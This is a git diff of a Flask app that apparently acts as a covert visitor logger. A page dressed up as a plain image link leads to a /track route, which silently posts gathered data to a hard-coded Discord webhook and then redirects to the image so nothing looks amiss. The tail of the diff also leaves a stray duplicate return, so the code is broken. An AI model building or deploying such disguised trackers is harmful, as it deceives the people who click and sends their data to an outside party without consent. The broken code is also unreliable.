@@ -1,6 +1,7 @@
 from flask import Flask, request, redirect, make_response
 import requests
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 
@@ -8,15 +9,14 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l
 
 @app.route('/')
 def og_image_preview():
+
     html = '''
     <html>
       <head>
         <meta property="og:image" content="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" />
       </head>
-      <body>
-        <a href="/track">
-          <img src="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" style="width:100%;height:auto;" />
-        </a>
+      <body style="margin:0; padding:0;">
+        <img src="https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180" style="width:100vw; height:100vh; object-fit:contain;" />
       </body>
     </html>
     '''
@@ -43,5 +43,13 @@ def track_and_redirect():
         requests.post(WEBHOOK_URL, json=data)
     except:
         pass
+
+
+    return redirect("https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180")
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
+
 
     return redirect("https://tse2.mm.bing.net/th?id=OIP.rfrxsx6jbbLi1C9fvvaEKwAAAA&pid=Api&P=0&h=180")
